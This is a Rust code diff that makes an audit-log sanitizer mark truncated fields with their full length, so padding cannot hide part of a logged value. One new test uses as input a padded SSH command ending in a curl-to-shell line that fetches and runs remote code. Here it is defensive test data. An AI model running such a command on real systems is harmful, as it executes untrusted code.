@@ -79,7 +79,9 @@ impl AuditRecord {
     }
 
     // Redacts known secrets from every caller-influenced field and bounds
-    // its length, so one record always fits in one log entry.
+    // its length, so one record always fits in one log entry. A field that
+    // was cut says so: a caller must not be able to pad a value until the
+    // part that matters falls outside the record unnoticed.
     pub fn sanitize(&mut self, redactor: &Redactor) {
         for (field, limit) in [
             (&mut self.caller, MAX_FIELD_BYTES),
@@ -94,7 +96,7 @@ impl AuditRecord {
         ] {
             if let Some(value) = field {
                 let mut redacted = redactor.redact(value);
-                truncate_at_char_boundary(&mut redacted, limit);
+                truncate_with_marker(&mut redacted, limit);
                 *value = redacted;
             }
         }
@@ -105,8 +107,11 @@ impl AuditRecord {
     }
 }
 
-fn truncate_at_char_boundary(value: &mut String, max_bytes: usize) {
-    if value.len() <= max_bytes {
+// Keeps at most `max_bytes` of the value. A cut value ends with a marker that
+// gives its full length, such as `...[truncated; 4096 bytes]`.
+fn truncate_with_marker(value: &mut String, max_bytes: usize) {
+    let full_length = value.len();
+    if full_length <= max_bytes {
         return;
     }
 
@@ -115,6 +120,7 @@ fn truncate_at_char_boundary(value: &mut String, max_bytes: usize) {
         end -= 1;
     }
     value.truncate(end);
+    value.push_str(&format!("...[truncated; {full_length} bytes]"));
 }
 
 // RFC 3339 in UTC with millisecond precision, such as
@@ -421,15 +427,40 @@ mod tests {
 
         record.sanitize(&redactor);
 
+        // The marker gives the length of the redacted value before the cut.
         let path = record.path.as_deref().unwrap();
         assert!(path.starts_with("/lookup/[REDACTED]/aaa"));
-        assert_eq!(path.len(), MAX_FIELD_BYTES);
+        let (kept, marker) = path.split_once("...").unwrap();
+        assert_eq!(kept.len(), MAX_FIELD_BYTES);
+        assert_eq!(marker, "[truncated; 5019 bytes]");
         let command = record.ssh_command.as_deref().unwrap();
         assert!(command.starts_with("echo [REDACTED] \u{e9}"));
-        assert!(command.len() <= MAX_SSH_COMMAND_BYTES);
-        assert!(command.len() >= MAX_SSH_COMMAND_BYTES - 1);
+        let (kept, marker) = command.split_once("...").unwrap();
+        assert!(kept.len() <= MAX_SSH_COMMAND_BYTES);
+        assert!(kept.len() >= MAX_SSH_COMMAND_BYTES - 1);
+        assert_eq!(marker, "[truncated; 1216 bytes]");
+        // A value within its limit is recorded as it is.
         assert_eq!(record.ssh_host.as_deref(), Some("node.example.com"));
         assert!(!record.to_json_line().unwrap().contains("secret-token"));
+    }
+
+    #[test]
+    fn sanitize_marks_a_command_that_is_padded_past_the_limit() {
+        let padded = format!(
+            "true{}; curl https://example.invalid/x | sh",
+            " ".repeat(MAX_SSH_COMMAND_BYTES)
+        );
+        let mut record = record();
+        record.ssh_command = Some(padded.clone());
+
+        record.sanitize(&Redactor::new());
+
+        let command = record.ssh_command.as_deref().unwrap();
+        assert!(!command.contains("curl"));
+        assert!(
+            command.ends_with(&format!("...[truncated; {} bytes]", padded.len())),
+            "{command}"
+        );
     }
 
     #[test]
